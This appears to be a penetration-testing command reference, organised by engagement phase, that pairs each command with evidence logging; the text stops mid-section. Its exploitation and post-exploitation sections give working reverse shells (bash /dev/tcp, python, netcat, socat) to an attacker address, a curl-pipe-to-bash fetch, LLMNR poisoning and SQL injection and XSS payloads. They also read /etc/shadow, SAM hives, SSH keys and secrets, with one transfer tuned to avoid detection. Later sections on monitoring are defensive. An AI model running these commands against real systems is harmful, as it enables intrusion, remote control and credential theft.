# Terminal Operations — Payloads & Commands

> **Companion to**: `SKILL.md` — Terminal operations workflow and evidence chain protocol
> **See also**: `test-cases.md` — Structured test scenarios for terminal operations

Organized by engagement phase. Every command includes evidence capture patterns following the Evidence Chain Protocol defined in SKILL.md.

---

## Phase 1 — Reconnaissance Commands

### Network Reconnaissance

#### Nmap Variants

```bash
# TCP SYN scan with service/version detection — standard first pass
nmap -sS -sV -oA scans/nmap_syn_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Full port scan — when initial scan finds few ports
nmap -sS -p- -sV --min-rate 5000 -oA scans/nmap_full_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# UDP scan — top 100 ports, slower but essential
nmap -sU --top-ports 100 -sV -oA scans/nmap_udp_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Script scan — default NSE scripts for deep enumeration
nmap -sC -sV -oA scans/nmap_script_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Vulnerability scan — NSE vuln category
nmap --script vuln -oA scans/nmap_vuln_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Subnet sweep — discover live hosts before deep scan
nmap -sn -oA scans/nmap_sweep_$(date +%Y%m%d_%H%M%S) <target/CIDR> \
  | tee -a evidence.log
```

#### Masscan

```bash
# Fast port sweep — for large ranges, then feed results to nmap
masscan -p1-65535 --rate=1000 -oL scans/masscan_$(date +%Y%m%d_%H%M%S).txt <target>

# Targeted top-ports scan
masscan --top-ports 100 --rate=500 -oL scans/masscan_top100_$(date +%Y%m%d_%H%M%S).txt <target>
```

#### RustScan

```bash
# Fast all-port discovery, pipe to nmap for service detection
rustscan -a <target> -- -sV -oA scans/rustscan_$(date +%Y%m%d_%H%M%S)
```

### Web Reconnaissance

#### Curl Variants

```bash
# Basic HTTP response with headers
curl -v -sS -o /dev/null -D - http://<target> 2>&1 | tee -a evidence.log

# Full response body capture with timestamp
echo "=== $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
curl -sS -o web/response_$(date +%Y%m%d_%H%M%S).html -w "%{http_code} %{redirect_url}\n" http://<target> \
  | tee -a evidence.log

# TLS/SSL certificate inspection
curl -v -sS https://<target> 2>&1 | grep -A 20 "SSL\|TLS\|certificate" | tee -a evidence.log

# Follow redirects with evidence
curl -v -L -sS -o /dev/null http://<target> 2>&1 | tee -a evidence.log

# API endpoint probing with JSON output
curl -sS -H "Content-Type: application/json" http://<target>/api/v1/ \
  | jq . 2>/dev/null | tee -a evidence.log
```

#### Web Fingerprinting

```bash
# WhatWeb — technology identification
whatweb -v http://<target> | tee -a evidence.log

# Nikto — web server vulnerability scanner
nikto -h http://<target> -output scans/nikto_$(date +%Y%m%d_%H%M%S).txt \
  | tee -a evidence.log

# Wappalyzer CLI (if available)
wappalyzer http://<target> | tee -a evidence.log
```

#### Directory and File Discovery

```bash
# Gobuster — directory brute-force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
  -o scans/gobuster_$(date +%Y%m%d_%H%M%S).txt -x php,html,txt,bak \
  | tee -a evidence.log

# ffuf — fast fuzzer for directories, subdomains, parameters
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -o scans/ffuf_dirs_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# ffuf — subdomain enumeration (with DNS resolution)
ffuf -u http://FUZZ.<domain> -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt \
  -mc 200,301,302 -o scans/ffuf_subs_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# dirsearch — alternative directory scanner
dirsearch -u http://<target> -o scans/dirsearch_$(date +%Y%m%d_%H%M%S).txt \
  | tee -a evidence.log
```

### DNS Reconnaissance

```bash
# Basic DNS lookup
dig <domain> ANY +noall +answer | tee -a evidence.log

# Zone transfer attempt
dig axfr <domain> @<nameserver> | tee -a evidence.log

# DNSRecon — comprehensive DNS enumeration
dnsrecon -d <domain> -t std -o scans/dnsrecon_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# DNSRecon — brute-force subdomains
dnsrecon -d <domain> -t brt -D /usr/share/wordlists/dnsrecon/subdomains-top1mil-5000.txt \
  -o scans/dnsrecon_brt_$(date +%Y%m%d_%H%M%S).json | tee -a evidence.log

# dnsx — fast DNS toolkit
echo "<domain>" | dnsx -a -aaaa -cname -mx -ns -soa -txt \
  -o scans/dnsx_$(date +%Y%m%d_%H%M%S).txt | tee -a evidence.log

# Reverse DNS lookup
dig -x <IP> +short | tee -a evidence.log
```

### Service Enumeration

#### SMB Enumeration

```bash
# List shares
smbclient -L //<target> -N 2>&1 | tee -a evidence.log

# Connect to a specific share
smbclient //<target>/<share> -N -c "ls; exit" 2>&1 | tee -a evidence.log

# RPC enumeration
rpcclient -U "" <target> -c "srvinfo; enumdomusers; enumdomgroups" 2>&1 \
  | tee -a evidence.log

# Enum4linux — comprehensive SMB/NetBIOS enumeration
enum4linux -a <target> 2>&1 | tee scans/enum4linux_$(date +%Y%m%d_%H%M%S).txt
```

#### LDAP Enumeration

```bash
# LDAP search — dump naming contexts
ldapsearch -x -H ldap://<target> -s base namingcontexts 2>&1 | tee -a evidence.log

# LDAP search — dump all users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" \
  2>&1 | tee -a evidence.log

# LDAP search — dump all groups
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" \
  2>&1 | tee -a evidence.log
```

---

## Phase 2 — Exploitation Commands

### Reverse Shell Payloads

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker_ip>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell (traditional)
nc -e /bin/bash <attacker_ip> <port>

# Netcat reverse shell (openbsd variant — no -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> <port> > /tmp/f

# Socat reverse shell (fully interactive PTY)
socat TCP:<attacker_ip>:<port> EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Socat listener (for upgraded shells)
socat file:`tty`,raw,echo=0 TCP-L:<port>

# Pwncat — listener with auto-upgrade
pwncat-cs -l <port>
```

#### Catching Reverse Shells

```bash
# Netcat listener with logging
nc -lvnp <port> 2>&1 | tee -a shells/session_$(date +%Y%m%d_%H%M%S).log

# Upgrade to PTY after catch
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

### Web Exploitation

```bash
# SQLMap — automated SQL injection
sqlmap -u "http://<target>/page?id=1" --batch --dbs \
  --output-dir=exploits/sqlmap_$(date +%Y%m%d_%H%M%S) \
  | tee -a evidence.log

# SQLMap — dump specific database
sqlmap -u "http://<target>/page?id=1" --batch -D <database> --tables \
  | tee -a evidence.log

# SQLMap — with POST data
sqlmap -u "http://<target>/login" --data="user=admin&pass=test" --batch \
  --output-dir=exploits/sqlmap_$(date +%Y%m%d_%H%M%S) | tee -a evidence.log

# Commix — command injection exploitation
commix --url="http://<target>/page?cmd=test" --output-dir=exploits/commix_$(date +%Y%m%d_%H%M%S) \
  | tee -a evidence.log

# XSS testing — reflected
curl -sS "http://<target>/search?q=<script>alert(1)</script>" | grep -i "alert(1)" \
  | tee -a evidence.log

# XSS testing — stored (via curl POST)
curl -sS -X POST http://<target>/comment -d "comment=<script>alert(1)</script>" \
  -o /dev/null -w "%{http_code}\n" | tee -a evidence.log
```

### Network Exploitation

```bash
# Metasploit — resource script for batch execution
cat > exploits/msf_resource_$(date +%Y%m%d_%H%M%S).rc << 'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
run
EOF
msfconsole -r exploits/msf_resource_$(date +%Y%m%d_%H%M%S).rc

# Responder — LLMNR/NBT-NS poisoner
sudo responder -I <interface> -wrf -o exploits/responder_$(date +%Y%m%d_%H%M%S).log

# mitm6 — IPv6 man-in-the-middle
sudo mitm6 -i <interface> -d <domain> 2>&1 | tee -a evidence.log
```

---

## Phase 3 — Post-Exploitation Commands

### Privilege Escalation

```bash
# LinPEAS — Linux privilege escalation enumeration
curl -sS https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh \
  | bash 2>&1 | tee post/linpeas_$(date +%Y%m%d_%H%M%S).txt

# LinPEAS — from local file
bash linpeas.sh 2>&1 | tee post/linpeas_$(date +%Y%m%d_%H%M%S).txt

# WinPEAS — Windows privilege escalation (run on target)
.\winpeas.exe > winpeas_$(date +%Y%m%d_%H%M%S).txt 2>&1

# Linux Exploit Suggester
perl linux-exploit-suggester.pl 2>&1 | tee post/les_$(date +%Y%m%d_%H%M%S).txt

# Manual Linux checks
id && whoami && uname -a && cat /etc/os-release 2>&1 | tee -a evidence.log
sudo -l 2>&1 | tee -a evidence.log
find / -perm -4000 -type f 2>/dev/null | tee -a evidence.log
cat /etc/crontab 2>&1 | tee -a evidence.log

# Capability enumeration
getcap -r / 2>/dev/null | tee -a evidence.log
```

### Lateral Movement

```bash
# CrackMapExec — SMB sweep with credentials
crackmapexec smb <target_range> -u <user> -p <password> \
  --output-file post/cme_smb_$(date +%Y%m%d_%H%M%S).txt

# CrackMapExec — execute command
crackmapexec smb <target> -u <user> -p <password> -x "whoami" \
  | tee -a evidence.log

# Impacket — PsExec
impacket-psexec <domain>/<user>:<password>@<target> 2>&1 \
  | tee post/psexec_$(date +%Y%m%d_%H%M%S).log

# Impacket — WMIExec
impacket-wmiexec <domain>/<user>:<password>@<target> 2>&1 \
  | tee post/wmiexec_$(date +%Y%m%d_%H%M%S).log

# SSH tunneling — local port forward
ssh -L <local_port>:<internal_target>:<remote_port> <user>@<pivot_host> \
  -o StrictHostKeyChecking=no

# SSH tunneling — dynamic SOCKS proxy
ssh -D <socks_port> <user>@<pivot_host> -o StrictHostKeyChecking=no -N -f

# Proxychains — route through SOCKS proxy
echo "socks5 127.0.0.1 <socks_port>" >> /etc/proxychains4.conf
proxychains nmap -sT -sV -Pn <internal_target> 2>&1 | tee -a evidence.log
```

### Data Collection

```bash
# Find secrets — common file patterns
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" \
  -o -name "*.bak" -o -name "*.old" 2>/dev/null | head -50 | tee -a evidence.log

# Find SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" \
  2>/dev/null | tee -a evidence.log

# Search for credentials in files
grep -rIl "password\|passwd\|credential\|secret\|token" \
  /etc/ /var/ /opt/ /home/ 2>/dev/null | head -30 | tee -a evidence.log

# Hash dump — SAM database (Windows, admin required)
reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak

# Config extraction — common locations
cat /etc/shadow 2>/dev/null | tee -a evidence.log
cat /etc/passwd | tee -a evidence.log
```

---

## Evidence Capture Patterns

### Session Recording

```bash
# Start recorded session — captures all terminal I/O
script -q evidence/session_$(date +%Y%m%d_%H%M%S).log

# Start session with flush for real-time writing
script -q -f evidence/session_$(date +%Y%m%d_%H%M%S).log

# Stop recording
exit  # or Ctrl+D

# Replay a recorded session
scriptreplay evidence/session_20260514_143000.log
```

### Screenshot Organization

```bash
# Create evidence directory structure per target
mkdir -p evidence/<target>/scans
mkdir -p evidence/<target>/exploits
mkdir -p evidence/<target>/post
mkdir -p evidence/<target>/screenshots

# Screenshot with timestamp (macOS)
screencapture evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png

# Screenshot with timestamp (Linux with import from ImageMagick)
import evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png

# Screenshot with timestamp (Linux with scrot)
scrot evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png
```

### Output File Naming Convention

```
<tool>_<action>_<target>_<YYYYMMDD>_<HHMMSS>.<ext>

Examples:
  nmap_syn_192.168.1.100_20260514_143000.nmap
  nmap_syn_192.168.1.100_20260514_143000.xml
  nmap_syn_192.168.1.100_20260514_143000.gnmap
  gobuster_dir_10.10.10.5_20260514_150000.txt
  linpeas_192.168.1.100_20260514_160000.txt
```

### Hash Verification of Evidence

```bash
# Generate SHA-256 hashes for all evidence files
find evidence/ -type f -exec sha256sum {} \; \
  > evidence/evidence_hashes_$(date +%Y%m%d_%H%M%S).txt

# Verify hashes after collection
sha256sum -c evidence/evidence_hashes_20260514_143000.txt

# Single file hash (for chain of custody)
sha256sum evidence/session_20260514_143000.log | tee -a evidence.log

# MD5 alternative (faster, lower security — for quick verification)
md5sum evidence/session_20260514_143000.log | tee -a evidence.log
```

---

## Debugging & Troubleshooting

### Common Tool Failures and Fixes

```bash
# Nmap — "NOTE: UDP scan reliability"
# Fix: Run multiple times, increase retry count
nmap -sU --max-retries 3 -sV <target>

# Nmap — scan appears hung
# Fix: Reduce timing template, increase verbosity
nmap -T4 -v -sS <target>

# Gobuster — too many false positives
# Fix: Filter by status codes, add custom headers
gobuster dir -u http://<target> -w <wordlist> -s 200,204,301,302 \
  -H "Authorization: Bearer <token>"

# SQLMap — connection timeout
# Fix: Increase delay, add proxy
sqlmap -u "<url>" --delay=3 --timeout=30 --retries=3

# Metasploit — database not connected
# Fix: Initialize database
sudo systemctl start postgresql
sudo msfdb init
```

### Network Connectivity Debugging

```bash
# Check basic connectivity
ping -c 3 <target> 2>&1 | tee -a evidence.log

# Traceroute — identify network path
traceroute <target> 2>&1 | tee -a evidence.log

# Check specific port
nc -zv <target> <port> 2>&1 | tee -a evidence.log
timeout 5 bash -c "echo > /dev/tcp/<target>/<port>" 2>&1 | tee -a evidence.log

# DNS resolution check
host <target> 2>&1 | tee -a evidence.log
nslookup <target> 2>&1 | tee -a evidence.log

# Route table inspection
ip route show | tee -a evidence.log
route -n | tee -a evidence.log

# Interface status
ip addr show | tee -a evidence.log
```

### Permission Issues Resolution

```bash
# Check current user context
id && groups

# Check sudo permissions
sudo -l

# Check file permissions on target tool/script
ls -la /path/to/tool

# Verify capabilities on binary
getcap /path/to/tool

# Common fix: tool requires raw socket access
sudo setcap cap_net_raw+ep /path/to/tool

# Common fix: tool requires specific group
sudo usermod -aG <group> <user>  # requires re-login
```

### Tool Version Compatibility Checks

```bash
# Check nmap version and compiled features
nmap --version

# Check Metasploit version
msfconsole -q -x "version; exit"

# Check Python version
python3 --version

# Check curl features (TLS, protocols)
curl --version

# Check OpenSSL version and supported ciphers
openssl version -a
openssl ciphers -v | head -20

# Check impacket installation
python3 -c "import impacket; print(impacket.__version__)"

# Verify tool is in PATH
which <tool> && <tool> --version
```

---

## Advanced Terminal Patterns

### Process Management

```bash
# Find processes by port
lsof -i :8080
fuser 8080/tcp

# Kill process tree
kill -9 $(pgrep -f "process_name")
pkill -f "pattern"

# Monitor process resource usage
top -p $(pgrep -f "nmap") -b -n 1

# Background job management
jobs -l
fg %1
bg %2
disown %3
```

### File Transfer Methods

```bash
# Python HTTP server (quick file hosting)
python3 -m http.server 8888 --directory /opt/tools

# Upload via curl
curl -T file.txt http://attacker:8888/upload

# SCP with non-standard port
scp -P 2222 file.txt user@target:/tmp/

# Netcat file transfer
# Receiver:
nc -l -p 9999 > received.bin
# Sender:
nc target 9999 < payload.bin

# Base64 encode/decode for copy-paste transfer
base64 -w0 binary_file > encoded.txt
base64 -d encoded.txt > binary_file
```

### Log Analysis Patterns

```bash
# Real-time log monitoring with filtering
tail -f /var/log/auth.log | grep --line-buffered "Failed\|Accepted\|Invalid"

# Extract unique IPs from logs
grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' /var/log/auth.log | sort -u

# Count failed login attempts per IP
grep "Failed password" /var/log/auth.log | grep -oP '\d+\.\d+\.\d+\.\d+' | sort | uniq -c | sort -rn | head -10

# Timeline reconstruction
grep -h "$(date +%Y-%m-%d)" /var/log/*.log | sort -k1,2 | head -50
```

### Disk and Memory Operations

```bash
# Secure file deletion
shred -vfz -n 3 sensitive_file.txt

# Create RAM disk for temporary operations
mkdir /tmp/ramdisk
mount -t tmpfs -o size=512m tmpfs /tmp/ramdisk

# Find large files
find / -type f -size +100M 2>/dev/null | head -10

# Disk usage by directory
du -sh /* 2>/dev/null | sort -rh | head -10
```

### Cron and Scheduled Tasks

```bash
# List all cron jobs for all users
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" && echo "  ↑ $user"
done

# Check systemd timers
systemctl list-timers --all

# Monitor cron execution
grep CRON /var/log/syslog | tail -20
```

### Terminal Multiplexing Patterns

```bash
# tmux: create engagement layout
tmux new-session -d -s engagement \; \
  split-window -h \; \
  split-window -v \; \
  select-pane -t 0 \; \
  send-keys "tail -f evidence.log" C-m \; \
  select-pane -t 1 \; \
  send-keys "msfconsole" C-m \; \
  select-pane -t 2 \; \
  attach

# tmux: save pane output to file
tmux capture-pane -t engagement:0.0 -p > pane_output.txt

# tmux: synchronize panes (type in all at once)
tmux setw synchronize-panes on
```

---

## Advanced Shell Scripting

### Parallel Execution Patterns

```bash
# GNU Parallel — run nmap against multiple targets
cat targets.txt | parallel -j 10 "nmap -sT -sV {} -oA scans/nmap_{//}_{/.}"

# xargs parallel execution with progress
cat targets.txt | xargs -P 8 -I{} bash -c \
  'echo "[*] Scanning {}"; nmap -sT -p 80,443 {} > scans/{}.txt 2>&1'

# Background jobs with wait and status collection
declare -A PIDS
for target in $(cat targets.txt); do
  nmap -sT "$target" -oA "scans/$target" &
  PIDS[$target]=$!
done
for target in "${!PIDS[@]}"; do
  wait "${PIDS[$target]}" && echo "OK: $target" || echo "FAIL: $target"
done

# Parallel directory brute-force across multiple hosts
parallel --bar -j 5 \
  "gobuster dir -u http://{} -w /usr/share/wordlists/dirb/common.txt -o scans/gobuster_{}.txt" \
  :::: targets.txt

# Process substitution for parallel data feeds
diff <(nmap -sT -p 80 target1 -oG - | grep open) \
     <(nmap -sT -p 80 target2 -oG - | grep open)
```

### Error Handling Patterns

```bash
#!/bin/bash
# Robust error handling template for pentest scripts
set -euo pipefail
trap 'echo "[!] Error on line $LINENO (exit $?)" >&2; cleanup' ERR
trap 'cleanup' EXIT INT TERM

EVIDENCE_DIR="evidence/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

cleanup() {
  echo "[*] Cleaning up temporary files..."
  rm -f /tmp/scan_$$_* 2>/dev/null
  # Preserve evidence even on failure
  [ -d "$EVIDENCE_DIR" ] && echo "[*] Evidence preserved in $EVIDENCE_DIR"
}

safe_exec() {
  local cmd="$1"
  local timeout="${2:-60}"
  local output
  if output=$(timeout "$timeout" bash -c "$cmd" 2>&1); then
    echo "$output"
    return 0
  else
    echo "[!] Command failed (exit $?): $cmd" >&2
    echo "$output" >> "$EVIDENCE_DIR/errors.log"
    return 1
  fi
}

# Usage
safe_exec "nmap -sT -p 80 $TARGET" 120 | tee "$EVIDENCE_DIR/nmap.txt"
```

### Signal Traps and Graceful Shutdown

```bash
#!/bin/bash
# Long-running scan with graceful interrupt handling
RUNNING=true
SCAN_PID=""

handle_sigint() {
  echo -e "\n[!] Interrupt received — stopping scan gracefully..."
  RUNNING=false
  [ -n "$SCAN_PID" ] && kill -TERM "$SCAN_PID" 2>/dev/null
  # Save partial results
  echo "[*] Partial results saved to $EVIDENCE_DIR/"
  exit 130
}

handle_sigterm() {
  echo "[!] SIGTERM received — emergency shutdown"
  [ -n "$SCAN_PID" ] && kill -9 "$SCAN_PID" 2>/dev/null
  exit 143
}

trap handle_sigint SIGINT
trap handle_sigterm SIGTERM

# Run scan with interrupt awareness
while $RUNNING && read -r target; do
  echo "[*] Scanning: $target"
  nmap -sT "$target" -oA "$EVIDENCE_DIR/$target" &
  SCAN_PID=$!
  wait $SCAN_PID
  SCAN_PID=""
done < targets.txt
```

### Retry Logic and Exponential Backoff

```bash
# Retry with exponential backoff for flaky network operations
retry_with_backoff() {
  local max_attempts="${1:-5}"
  local base_delay="${2:-2}"
  shift 2
  local cmd="$*"
  local attempt=1

  while [ $attempt -le $max_attempts ]; do
    if eval "$cmd"; then
      return 0
    fi
    local delay=$((base_delay ** attempt))
    echo "[!] Attempt $attempt/$max_attempts failed. Retrying in ${delay}s..." >&2
    sleep $delay
    ((attempt++))
  done
  echo "[!] All $max_attempts attempts failed for: $cmd" >&2
  return 1
}

# Usage
retry_with_backoff 3 2 "curl -sS -o /dev/null -w '%{http_code}' http://$TARGET | grep -q 200"
retry_with_backoff 5 1 "nc -zv $TARGET 22 2>&1 | grep -q succeeded"
```

### Named Pipes and Process Coordination

```bash
# Create named pipe for inter-process communication during engagement
FIFO="/tmp/scan_pipe_$$"
mkfifo "$FIFO"

# Producer: feed discovered hosts to pipe
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}' > "$FIFO" &

# Consumer: scan each discovered host
while read -r host; do
  echo "[*] Deep scanning: $host"
  nmap -sT -sV "$host" -oA "scans/$host" &
done < "$FIFO"
wait
rm -f "$FIFO"
```

---

## Remote Operations

### SSH Multiplexing

```bash
# Configure SSH multiplexing for fast repeated connections
mkdir -p ~/.ssh/sockets
cat >> ~/.ssh/config << 'EOF'
Host pivot-*
  ControlMaster auto
  ControlPath ~/.ssh/sockets/%r@%h-%p
  ControlPersist 600
  ServerAliveInterval 30
  ServerAliveCountMax 3
EOF

# Open master connection (subsequent connections reuse this)
ssh -M -f -N pivot-host

# Execute multiple commands over single connection
ssh pivot-host "id && hostname && ip addr show"
ssh pivot-host "cat /etc/shadow" > evidence/shadow.txt
ssh pivot-host "netstat -tlnp" > evidence/listening.txt

# Close master connection when done
ssh -O exit pivot-host
```

### Rsync Patterns for Evidence Collection

```bash
# Sync evidence from remote target with compression
rsync -avz --progress -e "ssh -p 2222" \
  user@target:/var/log/ evidence/remote_logs/

# Incremental sync with bandwidth limit (avoid detection)
rsync -avz --bwlimit=500 --partial --progress \
  user@target:/opt/app/data/ evidence/app_data/

# Mirror remote directory structure for offline analysis
rsync -avz --include="*/" --include="*.conf" --include="*.yml" \
  --exclude="*" user@target:/ evidence/config_mirror/

# Secure evidence transfer with checksum verification
rsync -avz --checksum -e "ssh -o StrictHostKeyChecking=no" \
  evidence/ user@collection-server:/cases/$(date +%Y%m%d)/
```

### Remote Command Execution Patterns

```bash
# Execute command on multiple hosts via SSH
for host in $(cat targets.txt); do
  echo "=== $host ==="
  ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "user@$host" \
    "id; uname -a; cat /etc/os-release" 2>/dev/null || echo "FAILED: $host"
done | tee evidence/multi_host_enum.txt

# Parallel remote execution with GNU parallel
parallel -j 10 --tag \
  "ssh -o ConnectTimeout=5 {} 'sudo netstat -tlnp'" \
  :::: targets.txt > evidence/all_listeners.txt

# Remote script execution without file transfer
ssh user@target 'bash -s' << 'REMOTE_SCRIPT'
#!/bin/bash
echo "=== System Info ==="
uname -a
echo "=== Users ==="
cat /etc/passwd | grep -v nologin
echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null
REMOTE_SCRIPT

# SSH ProxyJump for multi-hop access
ssh -J user@jump1,user@jump2 user@internal-target "cat /etc/shadow"
```

### SCP and Secure File Operations

```bash
# Batch file collection from compromised host
declare -a COLLECT_FILES=(
  "/etc/passwd" "/etc/shadow" "/etc/hosts"
  "/etc/crontab" "/var/log/auth.log" "/var/log/syslog"
)
for f in "${COLLECT_FILES[@]}"; do
  scp -o StrictHostKeyChecking=no "user@target:$f" \
    "evidence/$(echo $f | tr '/' '_')" 2>/dev/null
done

# Recursive collection with exclusions
scp -r -o StrictHostKeyChecking=no \
  "user@target:/etc/" evidence/etc_backup/ 2>/dev/null

# Transfer through SOCKS proxy
scp -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" \
  user@internal:~/secrets.db evidence/
```

---

## System Monitoring

### Real-Time Resource Tracking

```bash
# Combined CPU/memory/network monitoring with timestamps
while true; do
  echo "$(date +%H:%M:%S) | CPU: $(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')% | \
MEM: $(free -m | awk '/Mem/{printf "%d/%dMB (%.1f%%)", $3, $2, $3/$2*100}') | \
NET: $(cat /proc/net/dev | awk '/eth0/{print "RX:"$2" TX:"$10}')"
  sleep 5
done | tee evidence/resource_monitor.log

# Watch for new network connections in real-time
watch -n 1 "ss -tnp | grep ESTAB | awk '{print \$4, \$5, \$6}' | sort"

# Monitor disk I/O per process
iotop -b -n 5 -d 2 -o | tee evidence/disk_io.txt

# Track file descriptor usage (detect resource exhaustion attacks)
watch -n 2 "ls /proc/*/fd 2>/dev/null | wc -l; echo '---'; lsof | wc -l"
```

### Process Forensics

```bash
# Capture full process details for suspicious PID
PID=<suspicious_pid>
echo "=== Process $PID ===" | tee evidence/proc_$PID.txt
cat /proc/$PID/cmdline | tr '\0' ' ' | tee -a evidence/proc_$PID.txt
echo "" | tee -a evidence/proc_$PID.txt
ls -la /proc/$PID/exe | tee -a evidence/proc_$PID.txt
cat /proc/$PID/environ | tr '\0' '\n' | tee -a evidence/proc_$PID.txt
cat /proc/$PID/maps | tee -a evidence/proc_$PID.txt
ls -la /proc/$PID/fd/ | tee -a evidence/proc_$PID.txt

# Detect hidden processes (compare ps output with /proc)
diff <(ps aux | awk '{print $2}' | sort -n) \
     <(ls /proc | grep -E '^[0-9]+$' | sort -n)

# Monitor process creation in real-time
sudo auditctl -a always,exit -F arch=b64 -S execve -k process_creation
sudo ausearch -k process_creation --start recent | tee evidence/new_processes.txt

# Capture deleted but still-running binaries
find /proc/*/exe -type l 2>/dev/null | while read link; do
  target=$(readlink "$link" 2>/dev/null)
  [[ "$target" == *"(deleted)"* ]] && echo "SUSPICIOUS: $link -> $target"
done | tee evidence/deleted_binaries.txt
```

### Network Monitoring

```bash
# Capture traffic on specific interface with rotation
sudo tcpdump -i eth0 -w evidence/capture_%Y%m%d_%H%M%S.pcap -G 300 -W 12 \
  'not port 22' &

# Monitor DNS queries in real-time (detect C2 beaconing)
sudo tcpdump -i eth0 -n port 53 -l 2>/dev/null | \
  awk '{print strftime("%H:%M:%S"), $0}' | tee evidence/dns_queries.txt

# Detect new listening ports (baseline comparison)
BASELINE="evidence/baseline_ports.txt"
ss -tlnp | awk '{print $4}' | sort > /tmp/current_ports.txt
[ -f "$BASELINE" ] && diff "$BASELINE" /tmp/current_ports.txt | grep "^>" \
  && echo "ALERT: New listening ports detected!"
cp /tmp/current_ports.txt "$BASELINE"

# Connection rate monitoring (detect port scans)
sudo conntrack -E -e NEW 2>/dev/null | awk '{
  split($0, a, " ");
  for(i in a) if(a[i] ~ /src=/) print strftime("%H:%M:%S"), a[i]
}' | tee evidence/new_connections.txt

# Bandwidth usage per connection
sudo iftop -t -s 10 -L 20 -n -N 2>/dev/null | tee evidence/bandwidth.txt
```

### System Integrity Monitoring

```bash
# Create filesystem baseline for change detection
find /etc /usr/bin /usr/sbin -type f -exec md5sum {} \; > evidence/fs_baseline.md5

# Check for modifications against baseline
md5sum -c evidence/fs_baseline.md5 2>/dev/null | grep "FAILED" | tee evidence/modified_files.txt

# Monitor critical file changes with inotifywait
inotifywait -m -r -e modify,create,delete,move \
  /etc /usr/bin /usr/sbin /var/spool/cron \
  --format '%T %w%f %e' --timefmt '%Y-%m-%d %H:%M:%S' \
  | tee evidence/file_changes.txt &
```

---

## Data Processing Pipelines

### jq/yq Patterns

```bash
# Parse nmap XML output to JSON and extract open ports
cat scan.xml | python3 -c "
import xmltodict, json, sys
data = xmltodict.parse(sys.stdin.read())
print(json.dumps(data, indent=2))
" | jq '.nmaprun.host.ports.port[] | select(.state[\"@state\"]==\"open\") | {port: .[\"@portid\"], service: .service[\"@name\"]}'

# Merge multiple JSON scan results
jq -s 'reduce .[] as $item ({}; . * $item)' scans/*.json > evidence/merged_results.json

# Extract unique IPs from JSON results with deduplication
jq -r '.. | .ip? // .target? // .host? // empty' scans/*.json | sort -u > evidence/all_ips.txt

# Transform Nuclei JSON output to CSV
cat nuclei_results.json | jq -r '[.info.severity, .host, .matched, .info.name] | @csv' \
  > evidence/findings.csv

# yq — parse and transform YAML configs
yq '.services | keys' docker-compose.yml
yq '.services[].ports[]' docker-compose.yml | sort -u
yq -o=json docker-compose.yml | jq '.services | to_entries[] | {name: .key, image: .value.image}'
```

### CSV/JSON Transformation

```bash
# Convert nmap grepable output to CSV
grep "Ports:" scan.gnmap | awk -F'[:/]' '{
  host=$1; gsub(/Host: /,"",host); gsub(/ .*/,"",host)
  for(i=1;i<=NF;i++) if($i~/open/) print host","$(i-1)","$(i+2)","$(i+4)
}' > evidence/open_ports.csv

# JSON to CSV with headers
echo "ip,port,service,version" > evidence/services.csv
jq -r '.hosts[] | .ip as $ip | .ports[] | [$ip, .port, .service, .version] | @csv' \
  scan_results.json >> evidence/services.csv

# CSV aggregation and statistics
awk -F',' 'NR>1{count[$3]++} END{for(s in count) print count[s], s}' \
  evidence/services.csv | sort -rn | head -20

# Convert between formats with Miller
mlr --icsv --ojson cat evidence/findings.csv > evidence/findings.json
mlr --icsv --opprint --from evidence/services.csv stats1 -a count -f port -g service
```

### Log Parsing Pipelines

```bash
# Parse Apache access logs — extract attack patterns
awk '{print $1, $7}' /var/log/apache2/access.log \
  | grep -iE "union|select|script|\.\./" \
  | sort | uniq -c | sort -rn | head -20 > evidence/attack_patterns.txt

# Multi-stage log correlation pipeline
# Stage 1: Extract failed SSH attempts
